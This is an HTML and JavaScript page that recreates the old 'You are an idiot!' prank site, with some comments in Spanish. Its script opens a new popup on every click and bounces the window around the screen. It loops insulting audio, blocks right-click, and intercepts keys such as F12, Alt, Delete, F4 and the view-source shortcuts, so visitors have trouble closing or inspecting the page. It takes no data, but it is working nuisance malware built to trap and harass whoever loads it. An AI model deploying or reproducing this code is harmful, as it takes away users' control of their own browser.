<head>
	<meta charset="utf-8">
	<title>You are an idiot!</title>
	<meta name="Author" content="TheGeekPug">
	<meta name="Keywords" content="TheGeekPug">
	<link rel="icon" type="image/png" href="youareanidiot.png">
	<style>
		body {
			margin-left: 0;
			background-color: #ffffff;
			overflow: hidden;
		}

		.idiot-container {
			position: absolute;
			top: 0;
			bottom: 0;
			width: 100%;
			height: 100%;
		}

		.idiot-container img {
			z-index: -100;
			height: 100%;
			width: auto;
			position: fixed;
			top: 50%;
			left: 50%;
			transform: translate(-50%, -50%);
		}
	</style>
</head>
<body>

	<div class="idiot-container">
		<audio id="youare-audio" src="you-are-an-idiot.mp3" loop></audio>
		<img src="idiot.gif" alt="You Are An Idiot" draggable="false" oncontextmenu="return false;">
	</div>

	<script>
		/* [Oct 2021] Added to comply with strict browser policies. */
		var audio = document.getElementById('youare-audio');

		document.addEventListener('click', musicPlay);

		function musicPlay() {
			if (audio.duration > 0 && audio.paused) {
				audio.play().catch(function(e) { console.log(e); });
			}
			document.removeEventListener('click', musicPlay);
		}

		var faudio = new Audio('you-are-an-idiot.mp3');
		faudio.addEventListener('timeupdate', function() {
			if (this.currentTime > this.duration - .45) {
				this.currentTime = 0;
				this.play();
			}
		});
		/* [Oct 2021] End part. */

		function bookmark() {
			if ((navigator.appName == "Microsoft Internet Explorer") && (parseInt(navigator.appVersion) >= 4)) {
				var url = "popup.html";
				var title = "Idiot!";
				window.external.AddFavorite(url, title);
			}
		}

		function openWindow(url) {
			var aWindow = window.open(url, "_blank", 'menubar=no, status=no, toolbar=no, resizable=no, width=357, height=330, titlebar=no, alwaysRaised=yes');
			if (aWindow) {
				setTimeout(function() {
					try { aWindow.opener = null; } catch(e) {}
				}, 150);
			}
		}

		document.body.addEventListener('click', function() {
			openWindow('popup.html');
		});

		window.onmouseout = function () {
			return null;
		};

		window.oncontextmenu = function() {
			return false;
		}

		window.onkeydown = function(e) {	
			var keyCode = e.keyCode;
			if (keyCode == 123 || keyCode == 17 || keyCode == 18 || keyCode == 46 || keyCode == 115 || (e.ctrlKey && (e.shiftKey && (keyCode == 73 || keyCode == 74 || keyCode == 67) || keyCode == 85 || keyCode == 83 || keyCode == 74))) {	
				alert("You are an idiot!"); 
				e.preventDefault();
				return false;
			}
			return null;
		}

		// --- CORREGIDO: FÍSICAS DE REBOTE INDEPENDIENTES EXACTAS DEL PAYASO ---
		const pantallaAncho = window.screen.availWidth;
		const pantallaAlto = window.screen.availHeight;
		const anchoV = 357;
		const altoV = 330;

		// Variable corregida a pantallaAncho de forma estricta
		let xPos = Math.random() * (pantallaAncho - anchoV);
		let yPos = Math.random() * (pantallaAlto - altoV);
		
		let xOff = Math.random() > 0.5 ? (Math.random() * 8 + 8) : -(Math.random() * 8 + 8);
		let yOff = Math.random() > 0.5 ? (Math.random() * 8 + 8) : -(Math.random() * 8 + 8);
		
		let flagRun = 1;

		function playBall() {
			xPos += xOff;
			yPos += yOff;
			
			if (xPos > pantallaAncho - anchoV) {
				xOff = Math.ceil(-6 * Math.random()) * 5 - 10;
				window.focus();
			}    
			if (xPos < 0) {
				xOff = Math.ceil(7 * Math.random()) * 5 - 10;
				window.focus();
			}
			
			if (yPos > pantallaAlto - altoV) {
				yOff = Math.ceil(-6 * Math.random()) * 5 - 10;
				window.focus();
			} 		
			if (yPos < 0) {
				yOff = Math.ceil(7 * Math.random()) * 5 - 10;
				window.focus();
			}
			
			if (flagRun == 1) {
				window.moveTo(xPos, yPos);
				setTimeout(playBall, 1);
			}
		}

		window.onload = function () {
			flagRun = 1;
			playBall(); 
			bookmark(); 
			
			audio.play().catch(function(err) { console.log("Esperando interacción"); });
			
			return true;
		}
	</script>
</body>
